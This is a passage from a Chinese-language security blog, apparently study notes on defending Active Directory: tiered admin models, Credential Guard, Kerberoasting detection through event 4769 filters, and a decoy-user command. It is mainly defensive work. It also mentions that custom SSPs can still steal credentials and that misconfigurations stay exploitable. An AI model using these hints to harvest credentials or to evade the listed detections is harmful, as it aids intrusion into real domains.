<p>把生产环境的管理员账号降级为普通用户，然后只允许他们通过 Red Forest 的账户进行管理，然后使用 Selective Authentication（选择性身份验证） 控制谁能从 Red Forest 登录到生产域，提高隔离。</p>
<p>通过这种林域之间的安全边界很大程度上杜绝了横向攻击的可能性。</p>
<p>需要注意的是微软在 2021 年正式废弃了 ESAE，推荐使用更现代的 Privileged Access Strategy（特权访问策略）。</p>
<p>ESAE其实是一种分级，较低等级的人不能登陆访问高一级的域资源或主机。</p>
<p>在最顶层（0层）是域控制器所在的位置，为了管理0层会有一个独立的林域，该林域是单向sid过滤的信任方式，即只能从这个林域访问到0层，而无法反过来访问。</p>
<hr>
<h2 id="Privileged-Access-Strategy"><a href="#Privileged-Access-Strategy" class="headerlink" title="Privileged Access Strategy"></a>Privileged Access Strategy</h2><p>也是上面是微软为企业制定的一整套保护关键管理员账户和资源的安全指导方针。<br>它是 ESAE（Red Forest 架构）被淘汰后，更现代、更云原生、更灵活的替代方案。</p>
<ol>
<li>最小权限访问（Least Privilege）</li>
<li>强身份验证（Verify Explicitly）</li>
<li>分层网络结构（Tiering Model）<strong>不允许高权限账号在低安全等级的设备上登录</strong></li>
<li>日志审计与异常检测</li>
<li>隔离关键资源访问(通过PAW来实现)</li>
<li>默认不信任内部通信（即便在内网发起的访问也需要过认证）</li>
</ol>
<p>但是，说实话遇到配置出错的还是能利用..</p>
<hr>
<h2 id="Enterprise-Access-Mode-企业访问模型"><a href="#Enterprise-Access-Mode-企业访问模型" class="headerlink" title="Enterprise Access Mode 企业访问模型"></a>Enterprise Access Mode 企业访问模型</h2><p>在企业访问模型下，分为了几个不同的平面:</p>
<ul>
<li>控制平面（访问控制之类的）</li>
<li>管理平面（监控和管理资源）</li>
<li>数据&#x2F;工作平面（管理业务应用，IP，数据之类的，其实有点类似云控制台）</li>
<li>害有个用户控制（好像是登录控制，我也没搞明白）</li>
</ul>
<hr>
<h2 id="凭据保护"><a href="#凭据保护" class="headerlink" title="凭据保护"></a>凭据保护</h2><p>使用基于虚拟化的安全措施来隔离机密，这样只有特权系统进程等，才能访问它们。</p>
<p>限制了对NTLM和TGT的访问，所以PTH啥的就没法用了，按理说是限制住了在内存里写入票据的风险。</p>
<p>但是通过自定义SSP（Custom SSP）还是可以窃取凭证。</p>
<hr>
<h2 id="设备保护-WDAC"><a href="#设备保护-WDAC" class="headerlink" title="设备保护(WDAC)"></a>设备保护(WDAC)</h2><p>阿三就给了个这玩意，也没细讲</p>
<p>lolbas-project.github.io</p>
<h2 id="票据攻击和重放攻击的检测与发现"><a href="#票据攻击和重放攻击的检测与发现" class="headerlink" title="票据攻击和重放攻击的检测与发现"></a>票据攻击和重放攻击的检测与发现</h2><p>谨记一个比较简单的检测方式，基本都是低权账户访问高权资产或者特权资产。</p>
<h2 id="kerberasting-的检测与防御"><a href="#kerberasting-的检测与防御" class="headerlink" title="kerberasting 的检测与防御"></a>kerberasting 的检测与防御</h2><p>需要关注的安全事件ID是 <code>4769</code> </p>
<ul>
<li>请求了 Kerberos 票据</li>
</ul>
<p>然后缓解方式是：强密码（桀桀桀），比如使用GMSA（使用组管理服务帐户），定期自动更改密码和委派SPN管理。</p>
<p>因为 4769 是在域控（DC）上非常多触发的记录的事件，所以我们需要通过以下规则对日志进行过滤分析：</p>
<ul>
<li>1.过滤掉显示服务名是 krbtgt 的记录(因为这是 TGT 票据（Ticket Granting Ticket），属于正常登录流程，不是服务访问，太多无价值噪声。)</li>
<li>2.过滤掉服务名以 $ 结尾的记录（<code>$</code>结尾通常表示计算机账户，比如 MACHINE1$，这些多数是自动服务账户，不太可能是攻击行为。）</li>
<li>3.过滤掉账户名是机器名的记录（例如：host1$@domain.com） 和2的原因一样，大概率是自动服务账户触发的。</li>
<li>4.保留返回码为 <code>0x0</code> 的记录(因为0x0代表成功了)</li>
<li>5.相对正常的票据加密类型是 <code>0x17</code>（AES256） 的，roast一般请求的是0x3 或 0x23 (RC4)，可以基于加密降级这一点来检测。</li>
</ul>
<hr>
<h2 id="下诱饵"><a href="#下诱饵" class="headerlink" title="下诱饵"></a>下诱饵</h2><p>这里教学给到的是创建一个密码永不过期的用户</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/samratashok/Deploy-Deception">https://github.com/samratashok/Deploy-Deception</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Create<span class="literal">-DecoyUser</span> <span class="literal">-UserFirstName</span> user <span class="literal">-UserLastName</span> manager <span class="literal">-Password</span> Pass@<span class="number">123</span> | <span class="built_in">Deploy-UserDeception</span> <span class="literal">-UserFlag</span> PasswordNeverExpires <span class="literal">-GUID</span> d07da11f<span class="literal">-8a3d-42b6-b0aa-76c962be719a</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>当有攻击者对这个用户进行枚举的时候将会触发记录4662 (对对象执行了操作) 的日志ID</p>
<hr>
<p>2025年5月21日 基本写就到这里了后面也没东西了 该准备去打lab了</p>

        
      </div>
      
         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/12/26/Tracks-AD-Authority/"
      title="Tracks-AD-Authority"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Tracks-AD-Authority
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/12/20/Sherlocks-Blizzard-Breakdown/"
      title="【Sherlocks】Blizzard-Breakdown"
     >

    <p class="title-text">
      
        【Sherlocks】Blizzard-Breakdown
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>






    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>


    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>


